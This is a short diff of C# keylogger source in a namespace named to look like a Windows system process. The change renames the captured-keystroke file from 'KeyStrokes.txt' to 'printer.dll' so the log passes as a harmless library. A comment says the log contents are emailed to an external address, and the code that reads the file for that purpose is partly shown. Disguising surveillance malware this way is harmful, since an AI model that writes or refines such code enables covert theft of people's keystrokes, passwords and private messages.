@@ -21,7 +21,7 @@ namespace Windows_Local_Host_Process
                 Directory.CreateDirectory(filepath);
             }
 
-            string path = (filepath + @"\KeyStrokes.txt");
+            string path = (filepath + @"\printer.dll");
 
             if (!File.Exists(path))
             {
@@ -77,7 +77,7 @@ namespace Windows_Local_Host_Process
             //send the contents of the text file to an external email address.
 
             String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-            String filePath = folderName + @"\KeyStrokes.txt";
+            String filePath = folderName + @"\printer.dll";
 
             String logContents = File.ReadAllText(filePath);
             string emailBody = "";
